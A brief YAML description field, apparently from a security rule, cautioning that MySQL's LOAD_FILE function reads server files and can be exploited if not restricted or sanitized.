  description: |
    The LOAD_FILE function in MySQL is potentially dangerous if not used carefully, as it can pose security risks. The function is designed to read the contents of a file on the server and return the file contents as a string. However, it can be exploited if not properly restricted or sanitized, leading to security vulnerabilities.
